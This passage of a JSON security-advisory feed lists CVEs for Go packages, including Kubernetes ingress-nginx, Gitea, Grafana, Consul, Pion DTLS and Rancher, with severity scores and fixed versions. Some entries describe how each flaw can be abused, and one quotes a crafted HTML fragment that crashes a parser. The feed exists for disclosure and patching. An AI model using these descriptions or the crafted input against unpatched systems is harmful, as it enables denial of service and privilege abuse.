overwrite", "details": "The Kubernetes ingress-nginx component prior to version 0.28.0 allows a user with the ability to create namespaces and to read and create ingress objects to overwrite the password file of another ingress which uses nginx.ingress.kubernetes.io/auth-type: basic and which has a hyphenated namespace or secret name.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/ingress-nginx"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.28.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8553"}, {"type": "WEB", "url": "https://github.com/kubernetes/ingress-nginx/issues/5126"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/ingress-nginx"}], "database_specific": {"cwe_ids": ["CWE-610", "CWE-73"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-13T21:00:22Z", "nvd_published_at": "2020-07-29T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-83g2-8m93-v3w7", "modified": "2023-02-08T00:33:11Z", "published": "2022-05-24T19:03:21Z", "aliases": ["CVE-2021-33194"], "summary": "golang.org/x/net/html Infinite Loop vulnerability", "details": "Go through 1.15.12 and 1.16.x through 1.16.4 has a golang.org/x/net/html infinite loop via crafted ParseFragment input.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20210520170846-37e1c6afe023"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-33194"}, {"type": "WEB", "url": "https://github.com/golang/net/commit/37e1c6afe02340126705deced573a85ab75209d7"}, {"type": "WEB", "url": "https://go.dev/cl/311090"}, {"type": "WEB", "url": "https://go.dev/issue/46288"}, {"type": "WEB", "url": "https://go.googlesource.com/net/+/37e1c6afe02340126705deced573a85ab75209d7"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/wPunbCPkWUg"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4CHKSFMHZVOBCZSSVRE3UEYNKARTBMTM/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0238"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:33:11Z", "nvd_published_at": "2021-05-26T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g7p7-x6w7-w6qg", "modified": "2022-05-24T22:19:58Z", "published": "2022-05-04T00:00:19Z", "aliases": ["CVE-2022-27313"], "summary": "Arbitrary file deletion in gitea", "details": "An arbitrary file deletion vulnerability in Gitea v1.16.3 allows attackers to cause a Denial of Service (DoS) via deleting the configuration file.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-27313"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/19072"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/releases/tag/v1.16.4"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-24T22:19:58Z", "nvd_published_at": "2022-05-03T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7phr-6cc9-4m5q", "modified": "2023-03-27T22:13:46Z", "published": "2022-05-24T16:49:05Z", "aliases": ["CVE-2019-13068"], "summary": "Grafana Cross-site Scripting vulnerability", "details": "`public/app/features/panel/panel_ctrl.ts` in Grafana before 6.2.5 allows HTML Injection in panel drilldown links (via the Title or url field).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "6.2.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-13068"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/issues/17718"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/releases/tag/v6.2.5"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190710-0001/"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/171500/Grafana-6.2.4-HTML-Injection.html"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-27T22:13:46Z", "nvd_published_at": "2019-06-30T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w3r9-r9w7-8h48", "modified": "2023-09-29T17:09:10Z", "published": "2022-05-24T17:11:45Z", "aliases": ["CVE-2019-11939"], "summary": "Golang Facebook Thrift servers vulnerable to denial of service", "details": "Golang Facebook Thrift servers would not error upon receiving messages declaring containers of sizes larger than the payload. As a result, malicious clients could send short messages which would result in a large memory allocation, potentially leading to denial of service. This issue affects Facebook Thrift prior to v2020.03.16.00.\n\n### Specific Go Packages Affected\ngithub.com/facebook/fbthrift/thrift/lib/go/thrift", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/facebook/fbthrift"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.31.1-0.20200311080807-483ed864d69f"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11939"}, {"type": "WEB", "url": "https://github.com/facebook/fbthrift/commit/483ed864d69f307e9e3b9dadec048216100c0757"}, {"type": "PACKAGE", "url": "https://github.com/facebook/fbthrift"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0082"}, {"type": "WEB", "url": "https://www.facebook.com/security/advisories/cve-2019-11939"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:26:28Z", "nvd_published_at": "2020-03-18T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f7ff-xf87-f22q", "modified": "2022-06-09T22:54:48Z", "published": "2022-05-27T00:00:29Z", "aliases": ["CVE-2022-29637"], "summary": "Arbitrary command execution in Minidoc", "details": "An arbitrary file upload vulnerability in Mindoc v2.1-beta.5 allows attackers to execute arbitrary commands via a crafted Zip file.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mindoc-org/mindoc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "2.1-beta.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29637"}, {"type": "WEB", "url": "https://github.com/mindoc-org/mindoc/issues/788"}, {"type": "PACKAGE", "url": "github.com/mindoc-org/mindoc"}], "database_specific": {"cwe_ids": ["CWE-434"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-03T18:39:00Z", "nvd_published_at": "2022-05-26T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4qvx-qq5w-695p", "modified": "2023-06-09T23:24:03Z", "published": "2022-05-14T01:36:20Z", "aliases": ["CVE-2018-19653"], "summary": "HashiCorp Consul can use cleartext agent-to-agent RPC communication", "details": "HashiCorp Consul 0.5.1 through 1.4.0 can use cleartext agent-to-agent RPC communication because the `verify_outgoing` setting is improperly documented. NOTE: the vendor has provided reconfiguration steps that do not require a software upgrade.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.5.1"}, {"fixed": "1.4.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-19653"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/pull/5069"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/b64e8b262f80397eab4f39c6ae7e14683cb9f55c"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/consul-tool/7TCw06oio0I"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-09T23:24:03Z", "nvd_published_at": "2018-12-09T19:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cx94-mrg9-rq4j", "modified": "2023-08-29T23:31:24Z", "published": "2022-05-24T22:04:38Z", "aliases": ["CVE-2022-29189"], "summary": "Pion/DTLS contains buffer for inbound DTLS fragments with no limit", "details": "### Impact\nA buffer that was used for inbound network traffic had no upper limit. Pion DTLS would buffer all network traffic from the remote user until the handshake completes or times out. An attacker could exploit this to cause excessive memory usage.\n\n### Patches\nUpgrade to Pion DTLS v2.1.4\n\n### Workarounds\nNo workarounds available, upgrade to Pion DTLS v2.1.4\n\n### References\nThank you to [Juho Nurminen](https://github.com/jupenur) and the Mattermost team for discovering and reporting this. \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Pion DTLS](http://github.com/pion/dtls)\n* Email us at [team@pion.ly](mailto:team@pion.ly)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pion/dtls"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pion/dtls/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pion/dtls/security/advisories/GHSA-cx94-mrg9-rq4j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29189"}, {"type": "WEB", "url": "https://github.com/pion/dtls/commit/a6397ff7282bc56dc37a68ea9211702edb4de1de"}, {"type": "WEB", "url": "https://github.com/pion/dtls/releases/tag/v2.1.4"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0461"}, {"type": "PACKAGE", "url": "github.com/pion/dtls"}], "database_specific": {"cwe_ids": ["CWE-120"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-24T22:04:38Z", "nvd_published_at": "2022-05-21T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cm8f-h6j3-p25c", "modified": "2023-08-29T23:32:40Z", "published": "2022-05-24T22:05:00Z", "aliases": ["CVE-2022-29190"], "summary": "Pion DTLS Header reconstruction method can be thrown into an infinite loop", "details": "### Impact\nAn attacker can send packets that will send Pion DTLS into an infinite loop when processing.\n\n### Patches\nUpgrade to Pion DTLS v2.1.4\n\n### Workarounds\nNo workarounds available, upgrade to Pion DTLS v2.1.4\n\n### References\nThank you to [Juho Nurminen](https://github.com/jupenur) and the Mattermost team for discovering and reporting this. \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Pion DTLS](http://github.com/pion/dtls)\n* Email us at [team@pion.ly](mailto:team@pion.ly)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pion/dtls"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pion/dtls/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pion/dtls/security/advisories/GHSA-cm8f-h6j3-p25c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29190"}, {"type": "WEB", "url": "https://github.com/pion/dtls/commit/e0b2ce3592e8e7d73713ac67b363a2e192a4cecf"}, {"type": "WEB", "url": "https://github.com/pion/dtls/releases/tag/v2.1.4"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0460"}, {"type": "PACKAGE", "url": "github.com/pion/dtls"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-24T22:05:00Z", "nvd_published_at": "2022-05-21T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mv93-wvcp-7m7r", "modified": "2023-10-02T16:33:31Z", "published": "2022-05-13T01:26:08Z", "aliases": ["CVE-2018-17848"], "summary": "golang.org/x/net/html Improper Validation of Array Index vulnerability", "details": "The html package (aka `x/net/html`) through 2018-09-25 in Go mishandles <math><template><mn><b></template>, leading to a \"panic: runtime error\" (index out of range) in (*insertionModeStack).pop in node.go, called from inHeadIM, during an html.Parse call.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20190125002852-4b62a64f59f7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-17848"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/27846"}, {"type": "WEB", "url": "https://go.dev/cl/159397"}, {"type": "WEB", "url": "https://go.dev/issue/27846"}, {"type": "WEB", "url": "https://go.googlesource.com/net/+/4b62a64f59f73840b9ab79204c94fee61cd1ba2c"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LREEWY6KNLHRWFZ7OT4HVLMVVCGGUHON/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UKRCI7WIOCOCD3H7NXWRGIRABTQOZOBK/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0197"}], "database_specific": {"cwe_ids": ["CWE-129"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:34:13Z", "nvd_published_at": "2018-10-01T08:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8xmx-h8rq-h94j", "modified": "2023-06-09T23:23:51Z", "published": "2022-05-24T17:48:04Z", "aliases": ["CVE-2020-25864"], "summary": "HashiCorp Consul Cross-site Scripting vulnerability", "details": "HashiCorp Consul and Consul Enterprise up to version 1.9.4 key-value (KV) raw mode was vulnerable to cross-site scripting. Fixed in 1.9.5, 1.8.10 and 1.7.14.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"fixed": "1.8.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.14"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-25864"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-07-consul-api-kv-endpoint-vulnerable-to-cross-site-scripting/23368"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202208-09"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/consul"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-09T23:23:51Z", "nvd_published_at": "2021-04-20T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hx8w-ghh8-r4xf", "modified": "2023-01-19T00:58:51Z", "published": "2022-05-02T19:26:55Z", "aliases": ["CVE-2021-4200"], "summary": "Write access to the catalog for any user when restricted-admin role is enabled in Rancher", "details": "### Impact\n\nThis vulnerability only affects customers using the [`restricted-admin`](https://rancher.com/docs/rancher/v2.6/en/admin-settings/rbac/global-permissions/#restricted-admin) role in Rancher. For this role to be active, Rancher must be bootstrapped with the environment variable `CATTLE_RESTRICTED_DEFAULT_ADMIN=true` or the configuration flag `restrictedAdmin=true`.\n\nA flaw was discovered in Rancher versions from 2.5.0 up to and including 2.5.12 and from 2.6.0 up to and including 2.6.3 where the `global-data` role in `cattle-global-data` namespace grants write access to the Catalogs. Since each user with any level of catalog access was bound to the `global-data` role, this grants write access to templates (`CatalogTemplates`) and template versions (`CatalogTemplateVersions`) for any user with any level of catalog access. New users created in Rancher are by default assigned to the `user` role (standard user), which is not designed to grant write catalog access. This vulnerability effectively elevates the privilege of any user to write access for the catalog template and catalog template version resources.\n\nA malicious user could abuse this vulnerability to:\n\n1. Make applications or individual versions of applications visible or hidden on the UI, by modifying `version` and `rancherMaxVersion` fields.\n2. Change the logo (field `icon`) of an application or template to an arbitrary image.\n3. Make a chart appear as a trusted or partner chart. This can be abused to make less trusted charts, such as customer defined charts, appear more legitimate than they are, by adding the label `io.rancher.certified: partner`.\n4. Swap template versions between templates of charts inside the same catalog. This can be exploited to swap the files from one chart or version to another, by changing `versionDir` field. When a user on the target cluster deploys their chart, it will deploy the modified version.\n\nThis vulnerability does not allow to modify the base64 encoded `files` fields of the `templateVersions`, so one cannot inject arbitrary data to charts that have already been pulled from their respective catalog.\n\nWithout access to the Catalog, malicious users are limited to injecting apps which already exist in a registered catalog. They would need write access to the catalog or external write access to a source repo to inject arbitrary code.\n\n### Patches\nPatched versions include releases 2.5.13, 2.6.4 and later versions.\n\n### Workarounds\nLimit access in Rancher to trusted users. There is not a direct mitigation besides upgrading to the patched Rancher versions.\n\n**Note:** If you use the `restricted-admin` as the default admin role in your environment, it's highly advised to review `CatalogTemplates` and `CatalogTemplateVersions` for possible malicious modifications.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.13"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-hx8w-ghh8-r4xf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4200"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1193992"}, {"type": "WEB", "url": "https://rancher.com/docs/rancher/v2.6/en/admin-settings/rbac/global-permissions/#restricted-admin"}, {"type": "PACKAGE", "url": "github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-269", "CWE-285"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-02T19:26:55Z", "nvd_published_at": "2022-05-02T12:16:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pvmg-xgmx-9mxh", "modified": "2022-05-25T19:29:51Z", "published": "2022-05-07T00:00:49Z", "aliases": ["CVE-2021-25745"], "summary": "Improper Input Validation in k8s.io/ingress-nginx", "details": "A security issue was discovered in ingress-nginx where a user that can create or update ingress objects can use the spec.rules[].http.paths[].path field of an Ingress object (in the networking.k8s.io or extensions API group) to obtain the credentials of the ingress-nginx controller. In the default configuration, that credential has access to all secrets in the cluster.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/ingress-nginx"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25745"}, {"type": "WEB", "url": "https://github.com/kubernetes/ingress-nginx/issues/8502"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/ingress-nginx"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/7vQrpDZeBlc"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220609-0006/"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-25T19:29:51Z", "nvd_published_at": "2022-05-06T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-785h-hrf7-gqxc", "modified": "2023-08-02T20:53:09Z", "published": "2022-05-14T03:28:46Z", "aliases": ["CVE-2015-9258"], "summary": "Docker Notary Signature Algorithm Not Matched to Key vulnerability", "details": "In Docker Notary before 0.1, gotuf/signed/verify.go has a Signature Algorithm Not Matched to Key vulnerability. Because an attacker controls the field specifying the signature algorithm, they might (for example) be able to forge a signature by forcing a misinterpretation of an RSA-PSS key as Ed25519 elliptic-curve data.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/notary"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-9258"}, {"type": "WEB", "url": "https://github.com/theupdateframework/notary/blob/master/docs/resources/ncc_docker_notary_audit_2015_07_31.pdf"}, {"type": "WEB", "url": "https://web.archive.org/web/20160305015752/https://docs.docker.com/notary/changelog/"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-02T20:53:09Z", "nvd_published_at": "2018-03-31T21:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6m8r-jh89-rq7h", "modified": "2023-08-03T18:49:13Z", "published": "2022-05-24T17:43:45Z", "aliases": ["CVE-2021-25313"], "summary": "Rancher Cross-site Scripting Vulnerability", "details": "A Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Rancher allows remote attackers to execute JavaScript via malicious links. This issue affects: SUSE Rancher Rancher versions prior to 2.5.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.3.11"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25313"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/issues/31583"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1181852"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.3.11"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.4.14"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.5.6"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-10T23:48:08Z", "nvd_published_at": "2021-03-05T09:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mm7g-f2gg-cw8g", "modified": "2023-09-07T14:57:59Z", "published": "2022-05-13T01:38:23Z", "aliases": ["CVE-2017-1002102"], "summary": "Kubernetes arbitrary file overwrite", "details": "In Kubernetes versions 1.3.x, 1.4.x, 1.5.x, 1.6.x and prior to versions 1.7.14, 1.8.9 and 1.9.4 containers using a secret, configMap, projected or downwardAPI volume can trigger deletion of arbitrary files/directories from the nodes where they are running.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.7.14"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.7.13"}}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"fixed": "1.8.9"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.8.8"}}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.9.3"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-1002102"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/60814"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:0475"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-26T19:47:20Z", "nvd_published_at": "2018-03-13T17:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-927h-x4qj-r242", "modified": "2023-06-14T14:53:20Z", "published": "2022-05-14T01:33:06Z", "aliases": ["CVE-2018-20744"], "summary": "github.com/gofiber/fiber/v2 vulnerable to Origin Validation Error", "details": "The Olivier Poitrey Go CORS handler through 1.3.0 actively converts a wildcard CORS policy into reflecting an arbitrary Origin header value, which is incompatible with the CORS security design, and could lead to CORS misconfiguration security problems.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gofiber/fiber/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.43.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-20744"}, {"type": "WEB", "url": "https://github.com/gofiber/fiber/issues/2338"}, {"type": "WEB", "url": "https://github.com/rs/cors/issues/55"}, {"type": "WEB", "url": "https://github.com/gofiber/fiber/pull/2339"}, {"type": "PACKAGE", "url": "https://github.com/gofiber/fiber"}, {"type": "WEB", "url": "https://web.archive.org/web/20200227091122/http://www.securityfocus.com/bid/106834"}, {"type": "WEB", "url": "https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-chen.pdf"}], "database_specific": {"cwe_ids": ["CWE-346"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-14T14:53:20Z", "nvd_published_at": "2019-01-28T08:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ff28-f46g-r9g8", "modified": "2022-05-24T20:48:14Z", "published": "2022-05-24T20:48:14Z", "aliases": ["CVE-2022-1464"], "summary": "Cross-site Scripting in Gogs", "details": "### Impact\n\nThe malicious user is able to upload a crafted SVG file as the issue attachment to archive XSS. All installations [allow uploading SVG (`text/xml`) files as issue attachments (non-default)](https://github.com/gogs/gogs/blob/e51e01683408e10b3dcd2ace65e259ca7f0fd61b/conf/app.ini#L283-L284) are affected.\n\n### Patches\n\nCorrectly setting the Content Security Policy for the serving endpoint. Users should upgrade to 0.12.7 or the latest 0.13.0+dev.\n\n### Workarounds\n\n[Disable uploading SVG files (`text/xml`) as issue attachments](https://github.com/gogs/gogs/blob/e51e01683408e10b3dcd2ace65e259ca7f0fd61b/conf/app.ini#L283-L284).\n\n### References\n\nhttps://huntr.dev/bounties/34a12146-3a5d-4efc-a0f8-7a3ae04b198d/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on 